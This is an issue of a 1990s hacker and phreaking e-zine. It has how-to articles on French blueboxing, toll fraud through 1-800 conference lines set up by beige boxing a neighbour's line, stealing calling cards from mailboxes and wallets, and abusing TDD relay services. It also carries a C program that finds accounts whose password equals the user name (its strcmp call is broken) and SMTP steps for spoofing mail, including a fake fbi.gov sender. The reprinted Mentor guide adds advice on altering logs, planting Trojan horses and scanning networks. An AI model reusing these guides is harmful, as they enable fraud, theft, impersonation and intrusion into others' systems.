What's new in this issue:
       HBS has more than doubled in size! REality and UnaBomber were the
       first to join up with us, then after New Years, memor and Agrajag
       signed up, with Digital_X and theLURK3R both emailing me saying they
       wanted to join up. Then Redtyde and darkcyde both joined after I told
       them they were in if they wanted to be or not.

       We have some GREAT articles for you, memor tell us about Blue Boxing
       in France, while UnaBomber tells us about TDD Relay. REality has given
       us an mIRC mailbomber that works great, which will hopefully be added
       to HBS's up coming mIRC script.

Editorial   by Scud-O
        HBS has near tripled in size, and this I am VERY happy about. See the
whats new for this issue section above for details on that. I am also glad
that in all of darc's wisdom he added me to the bots. Thanks man, I am REALLY
greatful! HBS has grown so much that hopefully we can go back to our monthly
publication deadlines. It has been hard, 4 and 5 i could manage, but 6 was too
tight, even when made on a 6 week deadline. I ended up releasing it the day
after Christmas, and 11 days overdue. I dont know how we have been on deadline
for so long. phire has gone to doing one issue of hacknowledge every 3-4
months. That is the same for phrack and most other publications. HBS is
working hard or get an issue out at least every 6 weeks. HBS is lucky and has
suck great communication, mainly since we are all on #phreak.
This issue has been our largest yet, and so far everything has gone on fairly
well. I am luck that UnaBomber, REality and memor gave me their articles very
early. Since pretty much everyone in HBS wants to write for The HAVOC
Technical Journal, look for bigger and bigger issues and more features.
Already I am having to split up the articles between issues 7 and 8.

        ---===========================================---
        A Public Service Announcement from HBS and Scud-O

        I would like to tell everyone how hard it is to edit a mag like this.
phire knows, ( and he has even tried to get my to work for him and give up
THTJ) that it is very hard to get articles from everyone, reply to emails,
write articles, hang out on irc, work on the web page, etc. So if you are
thinking of making a mag DONT! IT IS NOT WORTH IT!!

                            END
        A Public Service Announcement from HBS and Scud-O
        ---===========================================---

Anyways, this mag has always reflected my point of view, and my personality.
That is what happens when you edit a mag. I have enjoyed this, but i know i
must let go and let this mag take its own shape and mold to the other HBS
members as well, so watch for a more slanterous mag from all of us at HBS
to all of you, the Hack/Phreak community!

        I'd like to thank everyone for their readership and kind comments. I
have worked to make this mag and our web page cool, and that would not be
possible with out your comments. So please if you have anything to say, good,
bad, ugly, whatever, please send them into the address below. Thanks.

this is a VERY simple general purpose mailbomber that uses the C Shell.

all you need to have is a BIG file to send this person, i say use a big dull
FAQ file or a file of gibberish

#! /bin/csh

          By memor                          */

I   ---  The Reasons Why BlueBoxing Is Possible In France.

1.1 *** France Telecoms AntiFraud Office Politic.
          1.11 Spying Office Of France Telecom.
          1.12 Main Office Of France Telecom.
          1.13 France Telecom Politic For Bluebox Fraud.

1.3 *** Companies Politic & Other Operators AntiFrauds Office Politic.
          1.31 France Telecom Spy FreeNumber For Companies.

I   ---  Some Reasons Which Explain Why BlueBox Is Possible In France. 

	1.1 *** France Telecoms AntiFrauds Office Politic.

        France Telecom, the Company which provides the phone services for
France, is the first and only company to provide phone service in France,
since it became privatized in 1996 a governemental company.  France Telecom
is known to make easy cash; local and national phone taxes are extremely
expensive and international taxes are only slightly lower.  Anything
they can do to make money, they do.  For example for $10us you can get a
little telecard with $2us credit for children, with their name and phone
number written on it.

	1.11 Spying Office Of France Telecom.

        France telecom has a Spying Office, where the public can call when
they think they have found a "hacker."  The phone company will sometimes
check what you say, but mostly they seem to be just trying to make more money.
An example, if you were to call and say  "I don't know, sometimes my phone
rings and when i ask who is there, i hear some been(26xxone,)" to which the
phone company would respond with "Your phone must have a technical problem,
which we can repair for only $1XXus."

        Their spying office only puts the information they find about
Phreakers and Hackers in a big file, so if a big company or government asks
for some important Hacker or Phreaker, France Telecom picks a few names and
addresses from the list and just hands it over to the cops.  Luckily, this
office is not extremely dangerous, because many phreakers actually work
there.  Sometimes when they finish work they go trashing in the France
Telecom dumpsters to find some devices to fraud the company they work for.

        1.12 Main Offices Of France Telecom.

        The main office of France Telecom is located in Paris.  They have
huge dumpsters there, guarded by a gate alarm, but if you make a trip to
Paris, be sure to go there and grab some modems, faxes, or any equipment
you really want.  Now, this Main Office is really the backbone of France
Telecom, it houses the technicians, administration and director of France
Telecom.  Here orders are sent to the smaller France Telecom offices, or
out to other countries.

Some of the smaller France Telecom offices are:

	+33 0380728050 -> Business Office  
	+33 0380727996 -> Technical Office 
	+33 0380727958 -> SOVTEL Technical Office
 	+33 0380301608 -> Phone Lines Making Office
	+33 0380406363 -> Network Office
	(From France Only)
	    0800215164 -> Professional Info-Line

	1.13 France Telecom Politic For Bluebox Fraud.

        To say it again, France Telecom doesn't care, they just want their
money.  If you were to bluebox off a company phone line, the will attempt
to bill the company for it, because they do not guarantee the security of
the lines.  If it's a large, powerful company that refuses to pay for it,
France Telecom will do it's best to make someone pay.  If they can't make
the company pay (They will try to bring lawsuits against the company and get
as much money as possible from them,) they will do their best to catch the
Phreaker responsible.  This is often impossible because the phreaker has
dissappeared from their logs, during all the time spent in lawsuits against
the large company.


	1.14 Teletel Network Of France Telecom + Money.

	The Teletel Network is the national french Network, you
can find some "Out Internet" on it , but very rarely, It uses
1200/25 Bauds , V23 Protocol the mostly... You must have a Videotex
Terminal (on PC, Softwares from GOTO applications like TimTel),
With that network , u can access (not for free) , Private Systems,
with password mostly, the cheapers one (0.13FF/min and 0.73FF on
connection opening) , after you can access the demo servers and some
private servers for a bit more expensive (0.36ff/min and 0.73FF on
connection opening) , for more expensive , u have the Television servers,
the sex servers , the downloading servers(slow as hell), the dial servers
(1.23ff/min and 0.73FF on connection opening), for more and more expensive,
You have the children servers, sex servers , Companies servers, 
Fax sending servers, Job finding servers (2.19ff/min to 4.36ff/min and
0.73ff on connection opening) and for REALLY expensive , u can access
some "foreign servers" (price are really expensive.. 2 mins on it and
no money on your account)

	From foreign countries, access Teletel Networks if u have a
modem which supports 1200/25 v23 and a videotex terminal (like Timtel you
can get on ftp.minitel.fr) , by the way the french modems are nammed
minitels, they are v23 (1200/25) only and in local use , you can boost them
to 9600 bauds, videotex mode, you buy it like 20FF to 50FF and after you
pay 80FF to 160FF/month , u cant break it because its to France Telecom
who rent you it. 

	Teletel network nammed 3613 (Private Servers)
	+33 0836431313

	Teletel network nammed 3614 (Private and Demo Servers)
	+33 0836431414

	Teletel network nammed 3615 (Private,Demo,Dial,...)
	+33 0836431515

The others networks cant be accessed from foreign countries, 
because they are too expensives, France Telecom knows that we
can fraud and bluebox for accessing it so , access to 3616 ,3617,
3619 arent allowed from foreign countries

	1.2 *** French Governement Politic.

A few years Ago, the governement was a Socialist and corrupted one,
they didnt care for anything.. *all* was allowed when it was a bit
hidden.. like Snes Games selling, Cracking, Hack, Phreaking. They
were only fighting a bit against Drug Selling. Now , we are under
a Capitalist government, but their politic are as the Socialist one,
they only fight more for all the stuff selling and Hack/Phreak but
not enough for stopping us (the difference with the Socialist one is
so little.)

        1.21 Homes Office Of French Governement.

The Homes Office in France is composed well of some directors corrupted,
and spies from the normal Police. They are really busy fighting against 
Islamist terrorists and Pedophilia, but well they have a big file which
has name & adress of supposed Hackers... so if we are a bit too dangerous
they will get their file and bust the *supposed* Hackers. Well they did
that one time, because someone hacked a private teletel network who was one
from the dst (departement de la securitée du territoire.. Territory Security
Departement) and recoreded all their big files. Well they dont care for
Phreakers, but they can be dangerous.

       1.22 DST Spying Office Of French Governement.

The DST spying of French Governement and Homes Office is the more dangerous
police of France, its like CIA in USA... but their spy doesnt really know
what is bluebox, well they have only skills for terrorism and for killing,
they cant understand what we are doing on their Phone Lines. And well they
have other stuff to do more important than busting a bunch of Phreakers.
Their main office is the homes office in Paris but they are in the whole 
France and in the foreign countries for some dark stuff... They just begin
to know a bit using Teletel Networks, but they have no skills i Internet
ones mostly.

       1.23 BCRCI and SEFTI Cops Office.

BCRCI and SEFTI (i cant translate what that mean) are two new organs of
French Police with fight against Computer Crime (Cracking mostly and
sometimes Hacking and Phreaking.) BCRCI is a bunch of cops with bust
Crackers and Warez dudes... They have enough skills for tracing Phreakers
and for busting Phreakers... 3 years Ago they busting the Cracking/Hacking/
Phreaking team of Dijon of Snes&Megadrive Games selling of France with the
help of DST. They are like 40 members in BCRCI.
SEFTI, organ of French Police and DST, members of SEFTI are from DST, they
have enough skills for busting Hackers.. They only try to bust hackers,
They have NO skills for busting Phreakers.. sometimes they bust some 
Crackers. Well SEFTI a few years ago have infiltrated and busted (their spy
was nammed Jean Bernard Condat) the French Chaos Computer Club (CCCF).
They can be really dangerous sometimes if u are not carefull.

     1.24 French Governement Politic For Telecoms Fraud. 

French Governement politics for telecoms fraud must be a dream for american
dudes or others one, they dont care at all.. They answer to unhappy people
that France Telecom must do his job and like i said , France Telecom doesnt
care at all too and make paying the dude whos account is down. Their little
BCRCI and SEFTI office have no money for fighting against us and their DST
are ordered to catch Terrorists and not the Phreakers dudes.
 
     1.3 *** Companies Politic & Other Operators AntiFrauds Office Politic.

          1.31 France Telecom Spy FreeNumber For Companies.

Well we can say there is no really politics in France for the Companies
to prevent Phreaking or Hacking, France Telecom gave an # Number you
can call when you suspect someone, somwhere to Bluebox or use a different
fraud system, that number is 0800361415.

                          Taking Advantage of 1-800 Services
                                           by

                                         disc0re
------------------------------------------------------------------------------------

DISCLAIMER:  This is for informational purposes ONLY, nothing else.  If you
choose to use this information at all you are taking 100% responsiblity, not
I, not the E-Zine this is in.
                                      Remember that.

&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

        Hi, welcome to my little piece of whatever zine this turns up in.  I
chose to write about 1-800 services because instead of collecting Calling
Cards, cracking PBXs, or just paying <GaG> for long distanced you have 1-800
numbers.  And of course the telco makes it so we can take advantage of it.

        There are 4 things that 1-800 services offer that you can take
        advantage of.

a: Collect Calls, rather simple, but hey, you get more results the harder you
   try.

b: Cofernces, w00h00, I will babble on for pages about this when it is my fav
   and rather simple.

c: Calling Cards, you have seen this everywhere, it is about time someone
   wrote a new text on it.

d: PBXs, this is rather simple if you just listen up and sit strait in your
   chair (sarcasm).

                                     Collect Calls
        
        Ok, lets start out with Collect Calls.  I know of about 5 collect
calling services off of my head.  First off, if you don't know what a collect
call is (heheh) it is simply when someone calls one of the many 1-800 numbers
I am about to list and puts in the number of the person they are trying to
call then says a name.  Then the person is asked if he/she will accept
the call, and if they do, they are billed at a rate of about 10 cents a
minute.  The 5 collect call services I can think of right now are;

AT&T- 1-800-CALL-ATT
MCI- 1-800-COLLECT
BcTell- 1-800-4455667 (ask for sarah, heheheh)
OCI- 1-800-288-2880
Simply the operator, if you don't know how to reach her, drop the text and
kill yourself.

        Now how to actually take advantage of this.  Use this like a pager,
short simple messages.  When you call up and it says "Say your name after the
tone." Instead of saying your name say, "Honey, its Joe, I am at the pimp
store, what size rubber suit did you want, call me at...." you see what I
mean.  What is usefull about this is that when piece of shit McDonald's
don't let you use thier special phone and say to use the payphone, you just
do this, have them call the payphone and blammo, you are chatting.

                                   Conferences

        The next way to take afvantage of 1-800 services is to
tele-conferencing.  Conferences are extremly expensive.  What someone does is
they call a 1-800 number and tell them how many ports (people) they would like
to have, if they want the people who will particiapte be called by the
conference place, or call a 1-800 number, you ALWAYS want to have it so you
call in, how long the conference will last, and if you want to take advantage
of outdialing (when you can call anywhere at the expense of the conference).
To give you an idea of how expensive this is it is 53 cents a minute, per
person, so a 8 hour, 7 person conference would cost  about 3 thousand bux.
There are many places to setup a conference and here is a list;

A Better Conference Service: 800.569.0788
AT&T Teleconference Service: 800.232.1234
A Business Conference Call-Inc: 800.580.0853
Access Conference Call Service: 800.777.1826
ACT Teleconferencing:  800.ACT.3719
Conference Call Service: 800.272.5663
Conference Pros International: 800.522.3377
ITC A Worldwide Telecommunications Company: 800.374.6543
Link Teleconference Service: 800.287.9849
MCI Conferencing Services: 800.480.3600
Popp Telcom: 800.848.4851

        For some reason the last 5 conferences I have been on that were setup
through AT&T have been cancelled in the middle of the conference by an
operator.  So don't use them anymore. Personally I suggest Access Conferencing
Call Service.  But that is just my lame opion :) Setting up a conference is
rather simple if you are any good at social engineering, beige boxing, or you
are just damn sneaky.  The first way, social engineering, is kinda hard to do
because you need to convince the operator to connect you to the actual
technicians who are running the whole thing.  I have seen this done and it
will work.  This one has less of a chance of getting shut down, but it much
harder to do.

        Beige boxing is the easiest, and the fastest.  All you need to do is
walk down the block to your enemy, plug your beige box in and call from there.
One thing is that it is always good to have no one home in the house, but if
you can't make sure then you need to actually cut the wires that you have your
beige box plugged into so it doesn't ring in the house.  Then from there
you call up one of the numbers and set it up.

        And the last one is if you are just sneaky.  You can just call from
any phone that IS NOT a payphone and set it up from there.  The one problem is
ALL conferences now have to call back the number you are billing it to and
make sure they accept charges.  So make sure you can answer the phone, just
say you paged your dad and he is calling back or soemthing.

                                             Calling Cards

        I know this kinda goes off of the subject of ripping off 1-800 services
but the whole purpose of doing that is to get free long distance, and that
is what calling cards is about.

        You can call up any of the Collect Call services to be able to use
your calling card numbers (I'll explain how to get those in a second) all of
them have the paying with a calling card option.

        The hardest part about using calling cards is actually getting them.
You could always just steal that electric thing that spits them out for 20 bux,
I am kidding.  The best way to get them if you live in a city is to walk down
your block looking in all the mail bin things. And hope that someone is getting
a calling card, possibly credit card, in the mail.  Calling Card Generators,
Credit Card Generators do NOT work, so don't think you can get a bunch of them
off of that.  I don't know if this is possible, but if it works it is the best
way.  Again, you need to be a good social engineer.  Goto the local gas
station or what ever and figure out when the employees change shifts. When
someone new comes in tell him you called a half hour ago and say that he has
5 calling cards (don't push your luck and say 50) on hold for you pre-paid that
you forgot to pickup earlier in the day.  With a little convincing this should
work.  Another way is to just simply steal a wallet.

                                          PBXs

        PBX stands for Privare Branch eXchange.  These are small switching
systems that large businesses use to handle their office.  Most of them have
a 1-800 number that you call up and then put in a code.  From there you can
dial out to anywhere in the world.  The problem is that you need to scan for
them and sometimes they can be very hard to find.  And then you need to
crack the pass"word".  The passcode is a series of numbers, like 31337 which
happens to be the code to my voice mail, now I need to change that.
Then after you get that you sometimes get a menu and soemtimes you just need
to guess numbers.  To find one of these to play with you need to use a
wardialer (for Windows, use PhoneTag) and just dial numbers at random from it.
As soon as you find one I don't think there is any way to get the passcode
other than to guess.

        There is one other option and that is to goto a local big company
business and look around, ask questions, dress up like a telco repairman and
ask the supervisor.  Or you could always just go trashing.  These are extremly
useful if you can find one and get access to it. When dialing off of these you
might want to call the oper than have her connect you, because the people who
run these get a list, and if they see 50 unauthorized calls to your friend in
France then problems start to happen.

Well, I hope you like this text.  You can probably get a-hold of me by finding
an e-mail address on my webpage http://www.cybervoid.com/

Thanx for reading this and Thank you for abusing AT&T.

TDD for the DEAF and how to exploit the Fucker to DEATH 
by:UnaBomber

I am back. This is UnaBomber  and I am writing in regards to the phone
service that moist people overlook that is free and a whole lot of fun to use.
It is the TDD relay services for the deaf. For all of you fuckers out there
that dont know what TDD is it is Telecommunication Device for the Deaf. It
is basically just a keyboard and a display screen that they can type messages
to other people on. Well there is a thing called TDD relay services that most
people fail to notice. It is an operator that has a TDD machine sitting in
front of them and you connect to them and they dial up anyone in the state
that that relay service is in and they say whatever you type. I mean anything
you can cuss you can threaten you name it. They are great if you dont mind
typing youre messages out to the operator for them to say to the other party.
And best of all they are free! Here is how it works:

1.  Load yer favorite telecommunications program like Telemate and for most
    modems type atx0 to put the modem in reduced result code mode.(works on
    a hayes accura and a USR sportster and a logicode quiktel)

2.  Now you need to look up the relay number in the state that you want to
    talk to a person in. say I am in New Jersey and want to talk to someone
    in Illinois. I would get the number for the Illinois relay operator.

3.  Next you need to op divert to that 1800 relay service number. For any
    dumbass that doenst know what this is it is simply pushing 0 on yer
    phone and getting an operator and telling the bitch to dial this 800
    number for ya because yer fone is broke.

4.  Here is the tricky part for any uncoordinated fucks you need to type
    ATDT  and hit enter in the terminal program as soon as the operator dials
    the number for you so it connect ok use 1200 bps 8/N/1 and it will work
    fine some support 2400 bps but I use 1200 bps anyway its plenty fast
    enuff.

5.  Once connected they will ask for youre fone number that you are calling
    from give them a fony number from the state that the person you want to
    calls fone number is in. Like if I was calling to illinois I would tell
    them I was in illinois.

6.  now they will ask if you are connecting to a person with a TDD terminal
    or if they are going to relay it tell them  to relay it. And there ya go.



Now please take note there are special letters used to represent symbols
since the TDD doesnt have things like a question mark. So here is a
list of them:

Joes pt.1 by Scud-O

        A 'Joe' is a common term used to describe a UNIX user that uses his
username as his password. (or at least thats what some dumb arse UNIX security
'gurus' think) Any way this is a simple C program to crack 'joe' passwords.

If your system has shadowed passwords, then this program must be run as root.


/**********************************************************************
* joetest.c
*
* a -SIMPLE- password cracker that cracks account with the same username and
* password. (a 'joe')
*
*
* Written for The HAVOC Technical Journal issue 7 by Scud-O
* http://www.geocities.com/SiliconValley/8805/
***********************************************************************/
#include <stdio.h>
#include <pwd.h>

int main(int argc, char **argv)
{
        struct passwd *pw;

        while(pw=getpwent() )
        {
                char *crypt();
                char *result;

                result = crypt(pw->pw_name,pw->pw_passwd);

                if(!strcmp(result,pw->pw_name,pw->pw_passwd))
                {
                        printf(" %s is a joe\n", pw->pw_name);
                }
        }
        exit(0);
}

That is all you need. Next month i will use Perl to make an quicker version of
this, and a perl 5 advanced joe password cracker, and possibly a regular use
password cracker if i get the time.

How to Send FAKEMAIL

For those of you who dont know what fakemail is its just sending a mail to
someone and putting any return address you want.  This is good for practical
jokes or if you want to send someone almost anonymous email.

Heres what you do.

{1} Get a telnet program...one comes with windows 95, thats what I use.  

{2} Telnet to your mailserver, on port 25. 

{3} Type "HELO hostname" where "hostname" is filled in. Don't be an idiot!!!     Do not put in your real host!!!! 

{4} Enter "MAIL FROM:sender" where sender is your faked address. 
{5} Type in "RCPT TO:recipient" where recipient is your addressee. 
{6} Enter "DATA"  
{7} type in your message....
{8} on a separate line...type a period to end like this
.
That should work just fine the only problem is that you cant see what you
type so you have to do it sort of slow...but you could get another Telnet
client that will let you see what you type in. I hope that this gives you
great pleasure...hehe...here is a good MAIL FROM address...hehe
hackingcrimes@fbi.gov .....it FREAKS em out EVERY TIME!

				Have Fun,

RIGHT HERE:
you can see where ^_RoAcH_^ left the channel and came back as KeyIPup.
DiSCoRe, not lookin carefully thought it was the REAL Keystroke and opped
him. Then ^_RoAcH_^ de oped all of us, and retook his channel. So let this
be a reminder:
           !!!MAKE SURE YOU KNOW THE REAL USER WHO IS USIN A NICK!!!
           For example, do a /whois or read the user id after the nick of who
           has joined.

        Welcome to the second installmetn of RTFM. I hope you have read up on
the 'street smarts' of the 'underground' cause heres where it starts gettin'
dirty. This month i'm going to show you basic ( emphasis on BASIC ) hacking.
Included is The Mentor's 1989 basic guide to hacking. Yes its old, but it will
help you out with the old systems. You may ask what PRIMOSes are ( they were
great machines to hack... i LOVED the pre 18's easy to get in) since they are
not im much popularity anymore, oh well. 5 years ago, hell 10 years ago, the
world was a Digital VMS/VAX world. But with the popularity of the internet and
UNIX, UNIX is the prime os of the world now. The Mentor's guide talks of
telenet, an old packet switching network, which is harder to use bacause of
more security and access. The internet is the prime means of attack now, since
the easy access and telnet. I have also added a unix primer and next month, if
i can find a copy of THTJ issue 2 that i havent killed, i will add the UNIX to
DOS Convertion Kit that first ran in issue 2 to help out you DOS people. The
Basic Phreaking Info will not be run until a few issue down the road since i
want to help everyone out with hackin first.

        Also get the alt.2600/#hack FAQ  This will answer TONS of your
questions about hacking and phreaking. It is not hard to find, and i will add
a copy of it on my site soon.

This is HACK.TXT

Introduction: The State of the Hack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   After surveying a rather large g-file collection, my attention was drawn to
the fact that there hasn't been a good introductory file written for absolute
beginners since back when Mark Tabas was cranking them out (and almost
*everyone* was a beginner!)  The Arts of Hacking and Phreaking have changed
radically since that time, and as the 90's approach, the hack/phreak community
has recovered from the Summer '87 busts (just like it recovered from the Fall
'85 busts, and like it will always recover from attempts to shut it down), and
the progressive media (from Reality Hackers magazine to William Gibson and
Bruce Sterling's cyberpunk fables of hackerdom) is starting to take notice
of us for the first time in recent years in a positive light.
   Unfortunately, it has also gotten more dangerous since the early 80's.
Phone cops have more resources, more awareness, and more intelligence that they
exhibited in the past.  It is becoming more and more difficult to survive as
a hacker long enough to become skilled in the art.  To this end this file
is dedicated .  If it can help someone get started, and help them survive
to discover new systems and new information, it will have served it's purpose,
and served as a partial repayment to all the people who helped me out when I
was a beginner.

Part One: The Basics
~~~~~~~~~~~~~~~~~~~~
    As long as there have been computers, there have been hackers.  In the 50's
at the Massachusets Institute of Technology (MIT), students devoted much time
and energy to ingenious exploration of the computers.  Rules and the law were
disregarded in their pursuit for the 'hack'.  Just as they were enthralled with
their pursuit of information, so are we.  The thrill of the hack is not in
breaking the law, it's in the pursuit and capture of knowledge.
    To this end, let me contribute my suggestions for guidelines to follow to
ensure that not only you stay out of trouble, but you pursue your craft without
damaging the computers you hack into or the companies who own them.

I.    Do not intentionally damage *any* system.
II.   Do not alter any system files other than ones needed to ensure your
      escape from detection and your future access (Trojan Horses, Altering
      Logs, and the like are all necessary to your survival for as long as
      possible.)
III.  Do not leave your (or anyone else's) real name, real handle, or real
      phone number on any system that you access illegally.  They *can* and
      will track you down from your handle!
IV.   Be careful who you share information with.  Feds are getting trickier.
      Generally, if you don't know their voice phone number, name, and
      occupation or haven't spoken with them voice on non-info trading
      conversations, be wary.

V.    Do not leave your real phone number to anyone you don't know.  This
      includes logging on boards, no matter how k-rad they seem.  If you
      don't know the sysop, leave a note telling some trustworthy people
      that will validate you.
VI.   Do not hack government computers.  Yes, there are government systems
      that are safe to hack, but they are few and far between.  And the
      government has inifitely more time and resources to track you down than
      a company who has to make a profit and justify expenses.
VII.  Don't use codes unless there is *NO* way around it (you don't have a
      local telenet or tymnet outdial and can't connect to anything 800...)
      You use codes long enough, you will get caught.  Period.
VIII. Don't be afraid to be paranoid.  Remember, you *are* breaking the law.
      It doesn't hurt to store everything encrypted on your hard disk, or
      keep your notes buried in the backyard or in the trunk of your car.
      You may feel a little funny, but you'll feel a lot funnier when you
      when you meet Bruno, your transvestite cellmate who axed his family to
      death.
IX.   Watch what you post on boards.  Most of the really great hackers in the
      country post *nothing* about the system they're currently working
      except in the broadest sense (I'm working on a UNIX, or a COSMOS, or
      something generic.  Not "I'm hacking into General Electric's Voice Mail
      System" or something inane and revealing like that.)
X.    Don't be afraid to ask questions.  That's what more experienced hackers
      are for.  Don't expect *everything* you ask to be answered, though.
      There are some things (LMOS, for instance) that a begining hacker
      shouldn't mess with.  You'll either get caught, or screw it up for
      others, or both.
XI.   Finally, you have to actually hack.  You can hang out on boards all you
      want, and you can read all the text files in the world, but until you
      actually start doing it, you'll never know what it's all about.  There's
      no thrill quite the same as getting into your first system (well, ok,
      I can think of a couple of bigger thrills, but you get the picture.)

   One of the safest places to start your hacking career is on a computer
system belonging to a college.  University computers have notoriously lax
security, and are more used to hackers, as every college computer depart-
ment has one or two, so are less likely to press charges if you should
be detected.  But the odds of them detecting you and having the personel to
committ to tracking you down are slim as long as you aren't destructive.
   If you are already a college student, this is ideal, as you can legally
explore your computer system to your heart's desire, then go out and look
for similar systems that you can penetrate with confidence, as you're already
familar with them.
   So if you just want to get your feet wet, call your local college.  Many of
them will provide accounts for local residents at a nominal (under $20) charge.
   Finally, if you get caught, stay quiet until you get a lawyer.  Don't vol-
unteer any information, no matter what kind of 'deals' they offer you.  
Nothing is binding unless you make the deal through your lawyer, so you might
as well shut up and wait.

Part Two: Networks
~~~~~~~~~~~~~~~~~~
   The best place to begin hacking (other than a college) is on one of the
bigger networks such as Telenet.  Why?  First, there is a wide variety of
computers to choose from, from small Micro-Vaxen to huge Crays.  Second, the
networks are fairly well documented.  It's easier to find someone who can help
you with a problem off of Telenet than it is to find assistance concerning your
local college computer or high school machine.  Third, the networks are safer. 
Because of the enormous number of calls that are fielded every day by the big
networks, it is not financially practical to keep track of where every call and
connection are made from.  It is also very easy to disguise your location using
the network, which makes your hobby much more secure.
   Telenet has more computers hooked to it than any other system in the world
once you consider that from Telenet you have access to Tymnet, ItaPAC, JANET,
DATAPAC, SBDN, PandaNet, THEnet, and a whole host of other networks, all of
which you can connect to from your terminal.
   The first step that you need to take is to identify your local dialup port.
This is done by dialing 1-800-424-9494 (1200 7E1) and connecting.  It will
spout some garbage at you and then you'll get a prompt saying 'TERMINAL='.
This is your terminal type.  If you have vt100 emulation, type it in now.  Or
just hit return and it will default to dumb terminal mode.
   You'll now get a prompt that looks like a @.  From here, type @c mail <cr>
and then it will ask for a Username.  Enter 'phones' for the username. When it
asks for a password, enter 'phones' again.  From this point, it is menu
driven.  Use this to locate your local dialup, and call it back locally.  If
you don't have a local dialup, then use whatever means you wish to connect to
one long distance (more on this later.)
   When you call your local dialup, you will once again go through the
TERMINAL= stuff, and once again you'll be presented with a @.  This prompt lets
you know you are connected to a Telenet PAD.  PAD stands for either Packet
Assembler/Disassembler (if you talk to an engineer), or Public Access Device
(if you talk to Telenet's marketing people.)  The first description is more
correct.
   Telenet works by taking the data you enter in on the PAD you dialed into,
bundling it into a 128 byte chunk (normally... this can be changed), and then
transmitting it at speeds ranging from 9600 to 19,200 baud to another PAD, who
then takes the data and hands it down to whatever computer or system it's
connected to.  Basically, the PAD allows two computers that have different baud
rates or communication protocols to communicate with each other over a long
distance.  Sometimes you'll notice a time lag in the remote machines response. 
This is called PAD Delay, and is to be expected when you're sending data
through several different links.
   What do you do with this PAD?  You use it to connect to remote computer
systems by typing 'C' for connect and then the Network User Address (NUA) of
the system you want to go to.
   An NUA takes the form of   031103130002520
                              \___/\___/\___/

   There are two ways to find interesting addresses to connect to.  The first
and easiest way is to obtain a copy of the LOD/H Telenet Directory from the
LOD/H Technical Journal #4 or 2600 Magazine.  Jester Sluggo also put out a good
list of non-US addresses in Phrack Inc. Newsletter Issue 21.  These files will
tell you the NUA, whether it will accept collect calls or not, what type of
computer system it is (if known) and who it belongs to (also if known.)
   The second method of locating interesting addresses is to scan for them
manually.  On Telenet, you do not have to enter the 03110 DNIC to connect to a
Telenet host.  So if you saw that 031104120006140 had a VAX on it you wanted to
look at, you could type @c 412 614 (0's can be ignored most of the time.)
   If this node allows collect billed connections, it will say 412 614
CONNECTED and then you'll possibly get an identifying header or just a
Username: prompt.  If it doesn't allow collect connections, it will give you a
message such as 412 614 REFUSED COLLECT CONNECTION with some error codes out to
the right, and return you to the @ prompt.
   There are two primary ways to get around the REFUSED COLLECT message.  The
first is to use a Network User Id (NUI) to connect.  An NUI is a username/pw
combination that acts like a charge account on Telenet.  To collect to node
412 614 with NUI junk4248, password 525332, I'd type the following:
@c 412 614,junk4248,525332  <---- the 525332 will *not* be echoed to the
screen.  The problem with NUI's is that they're hard to come by unless you're
a good social engineer with a thorough knowledge of Telenet (in which case
you probably aren't reading this section), or you have someone who can
provide you with them.
   The second way to connect is to use a private PAD, either through an X.25
PAD or through something like Netlink off of a Prime computer (more on these
two below.)
   The prefix in a Telenet NUA oftentimes (not always) refers to the phone Area
Code that the computer is located in (i.e. 713 xxx would be a computer in
Houston, Texas.)  If there's a particular area you're interested in, (say,
New York City 914), you could begin by typing @c 914 001 <cr>.  If it connects,
you make a note of it and go on to 914 002.  You do this until you've found
some interesting systems to play with.
   Not all systems are on a simple xxx yyy address.  Some go out to four or
five digits (914 2354), and some have decimal or numeric extensions
(422 121A = 422 121.01).  You have to play with them, and you never know what
you're going to find.  To fully scan out a prefix would take ten million 
attempts per prefix.  For example, if I want to scan 512 completely, I'd have
to start with 512 00000.00 and go through 512 00000.99, then increment the
address by 1 and try 512 00001.00 through 512 00001.99.  A lot of scanning.
There are plenty of neat computers to play with in a 3-digit scan, however,
so don't go berserk with the extensions.
   Sometimes you'll attempt to connect and it will just be sitting there after
one or two minutes.  In this case, you want to abort the connect attempt by
sending a hard break (this varies with different term programs, on Procomm,
it's ALT-B), and then when you get the @ prompt back, type 'D' for disconnect.
   If you connect to a computer and wish to disconnect, you can type <cr> @
<cr> and you it should say TELENET and then give you the @ prompt.  From there,
type D to disconnect or CONT to re-connect and continue your session
uninterrupted.

Outdials, Network Servers, and PADs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   In addition to computers, an NUA may connect you to several other things.
One of the most useful is the outdial.  An outdial is nothing more than a modem
you can get to over telenet- similar to the PC Pursuit concept, except that
these don't have passwords on them most of the time.
   When you connect, you will get a message like 'Hayes 1200 baud outdial,
Detroit, MI', or 'VEN-TEL 212 Modem', or possibly 'Session 1234 established
on Modem 5588'.  The best way to figure out the commands on these is to
type ? or H or HELP- this will get you all the information that you need to
use one.
   Safety tip here- when you are hacking *any* system through a phone dialup,
always use an outdial or a diverter, especially if it is a local phone number
to you.  More people get popped hacking on local computers than you can
imagine, Intra-LATA calls are the easiest things in the world to trace inexp-
ensively.
   Another nice trick you can do with an outdial is use the redial or macro
function that many of them have.  First thing you do when you connect is to
invoke the 'Redial Last Number' facility.  This will dial the last number used,
which will be the one the person using it before you typed.  Write down the
number, as no one would be calling a number without a computer on it.  This
is a good way to find new systems to hack.  Also, on a VENTEL modem, type 'D'
for Display and it will display the five numbers stored as macros in the
modem's memory.
   There are also different types of servers for remote Local Area Networks
(LAN) that have many machine all over the office or the nation connected to
them.  I'll discuss identifying these later in the computer ID section.
   And finally, you may connect to something that says 'X.25 Communication
PAD' and then some more stuff, followed by a new @ prompt.  This is a PAD
just like the one you are on, except that all attempted connections are billed
to the PAD, allowing you to connect to those nodes who earlier refused collect
connections.
   This also has the added bonus of confusing where you are connecting from.
When a packet is transmitted from PAD to PAD, it contains a header that has
the location you're calling from.  For instance, when you first connected
to Telenet, it might have said 212 44A CONNECTED if you called from the 212
area code.  This means you were calling PAD number 44A in the 212 area.
That 21244A will be sent out in the header of all packets leaving the PAD.
   Once you connect to a private PAD, however, all the packets going out
from *it* will have it's address on them, not yours.  This can be a valuable
buffer between yourself and detection.

Phone Scanning
~~~~~~~~~~~~~~
